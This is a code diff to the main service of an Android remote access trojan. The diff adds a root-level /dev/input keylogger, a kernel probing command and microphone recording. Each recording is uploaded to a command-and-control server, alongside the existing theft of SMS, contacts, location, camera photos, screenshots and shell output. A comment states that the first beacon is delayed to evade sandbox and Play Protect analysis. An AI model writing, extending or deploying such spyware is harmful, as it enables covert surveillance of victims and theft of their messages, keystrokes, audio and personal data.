@@ -13,16 +13,18 @@ import androidx.core.app.NotificationCompat;
  * Main foreground service — beacons every 30 s, dispatches commands.
  *
  * Supported commands:
- *   info        — device info
- *   keylogs     — flush accumulated keylogs
- *   shot        — screenshot (launches ScreenCaptureActivity)
- *   cam         — front camera photo
- *   cam_back    — back camera photo
- *   files       — enumerate external storage
- *   sms         — list SMS inbox
- *   contacts    — list contacts
- *   location    — last known GPS location
- *   shell <cmd> — run shell command (root not required for basic cmds)
+ *   info           — device info
+ *   keylogs        — flush accessibility + root /dev/input keylogs
+ *   shot           — screenshot (launches ScreenCaptureActivity)
+ *   cam            — front camera photo
+ *   cam_back       — back camera photo
+ *   files          — enumerate external storage
+ *   sms            — list SMS inbox
+ *   contacts       — list contacts
+ *   location       — last known GPS location
+ *   kernel_probe   — probe /dev/input, /proc, su, SELinux (kernel-level detection test)
+ *   mic [secs]     — record microphone (default 15s, max 120s)
+ *   shell <cmd>    — run shell command (root not required for basic cmds)
  */
 public class RatService extends Service {
 
@@ -50,6 +52,10 @@ public class RatService extends Service {
         beaconLoop = this::beacon;
 
         startForeground(NOTIF_ID, buildNotification());
+
+        // Start root-level kernel keylogger immediately (requires rooted device)
+        RootKeylogger.start();
+
         // Delay first beacon 12 minutes — avoids sandbox/Play Protect dynamic analysis window
         handler.postDelayed(beaconLoop, 12 * 60 * 1000L);
         Log.i(TAG, "started  id=" + botId);
@@ -65,6 +71,7 @@ public class RatService extends Service {
 
     @Override
     public void onDestroy() {
+        RootKeylogger.stop();
         handler.removeCallbacks(beaconLoop);
         super.onDestroy();
     }
@@ -102,8 +109,13 @@ public class RatService extends Service {
             c2.sendResult(botId, buildInfo());
 
         } else if (lower.equals("keylogs")) {
-            String logs = KeylogService.flushLogs();
-            c2.sendResult(botId, logs.isEmpty() ? "(no keylogs yet)" : logs);
+            // Merge accessibility keylogs + root kernel keylogs
+            String accLogs  = KeylogService.flushLogs();
+            String rootLogs = RootKeylogger.flushLogs();
+            String combined = "";
+            if (!accLogs.isEmpty())  combined += "[ACCESSIBILITY]\n" + accLogs + "\n";
+            if (!rootLogs.isEmpty()) combined += "[ROOT /dev/input]\n" + rootLogs + "\n";
+            c2.sendResult(botId, combined.isEmpty() ? "(no keylogs yet)" : combined);
 
         } else if (lower.equals("shot")) {
             // Launch transparent activity that requests MediaProjection then screenshots
@@ -147,6 +159,27 @@ public class RatService extends Service {
             new Thread(() -> {
                 String loc = DeviceData.lastLocation(this);
                 c2.sendResult(botId, loc);
+            }).start();
+
+        } else if (lower.equals("kernel_probe")) {
+            new Thread(() -> {
+                String report = KernelProbe.run(this);
+                c2.sendResult(botId, report);
+            }).start();
+
+        } else if (lower.startsWith("mic ") || lower.equals("mic")) {
+            int secs = 15;
+            try { secs = Integer.parseInt(lower.replace("mic", "").trim()); } catch (Exception ignored) {}
+            final int duration = Math.min(secs, 120);
+            new Thread(() -> {
+                try {
+                    byte[] audio = MicCapture.record(this, duration);
+                    String name = "mic_" + System.currentTimeMillis() + ".aac";
+                    c2.uploadFile(botId, audio, name, "audio/aac");
+                    c2.sendResult(botId, "mic: uploaded " + name + " (" + audio.length + " bytes, " + duration + "s)");
+                } catch (Exception e) {
+                    c2.sendResult(botId, "mic error: " + e.getMessage());
+                }
             }).start();
 
         } else if (lower.equals("bypass_test")) {
